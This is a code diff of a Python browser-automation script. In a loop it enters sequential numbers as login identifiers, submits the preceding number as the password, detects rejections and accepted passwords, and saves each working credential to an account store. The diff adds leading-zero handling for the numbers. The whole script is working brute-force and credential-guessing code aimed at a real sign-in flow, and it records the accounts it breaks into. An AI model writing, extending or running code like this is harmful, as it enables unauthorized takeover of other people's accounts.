@@ -62,6 +62,7 @@ def main(account_data, postinfo, packages_id, body_mail):
         b.exit()
     # time.sleep(120)
     count = 0
+    
 
     for no in range(int(account_data['extra']), int(account_data['extra'])+1000):
         time.sleep(1)
@@ -75,7 +76,11 @@ def main(account_data, postinfo, packages_id, body_mail):
         count = count+1
         print(count)
         if count % 20 == 1:
-            worker_acc.update_account(data=no, id=account_data['id'])
+            number = no
+            if account_data['extra'][0:1]==0:
+                number = '0'+str(no)
+                
+            worker_acc.update_account(data="0"+str(number), id=account_data['id'])
             b.get_url(loginurl)
         if 'signinrejecte' in b.current_url():
 
@@ -85,14 +90,20 @@ def main(account_data, postinfo, packages_id, body_mail):
             
 
             b.get_url(loginurl)
+        
 
         if 'challenge/pwd' in b.current_url():
             oldNumber = str(no-1)
+            if account_data['extra'][0:1]==0:
+                oldNumber = '0'+str(no-1)
+            print(oldNumber)
+            worker_acc.save_account(data=oldNumber, soft_token=account_data['password'])
             password = b.visibil_element('name', "password")
 
             mailpass = oldNumber
             password.clear()
-            # password.send_keys(account_data['email'])
+            if account_data['extra'][0:1]:
+                password.send_keys(0)
             password.send_keys(mailpass)
 
             passwordNext = b.visibil_element(
@@ -106,9 +117,17 @@ def main(account_data, postinfo, packages_id, body_mail):
                 continue
             else:
                 print('pssword matched')
+                if account_data['extra'][0:1]:
+                    fullaccount= "pssword 0"+str(oldNumber)
+                else:
+                    fullaccount= str(oldNumber)
+                    
+                    
+                
+                
                 worker_acc.save_account(
-                    data=oldNumber, soft_token=account_data['password'])
-                worker_acc.update_account(data=oldNumber, id=account_data['id'])
+                    data=fullaccount, soft_token=account_data['password'])
+                worker_acc.update_account(data="0"+str(oldNumber), id=account_data['id'])
                 
 
         try:
@@ -136,7 +155,10 @@ def main(account_data, postinfo, packages_id, body_mail):
                 number = b.visibil_element('name', "identifier")
                 number.clear()
 
-                # number.send_keys(account_data['email'])
+                print(account_data['extra'][0:1])
+                if account_data['extra'][0:1]:
+                    number.send_keys(0)
+                
                 number.send_keys(no)
             except:
                 b.get_url(loginurl)
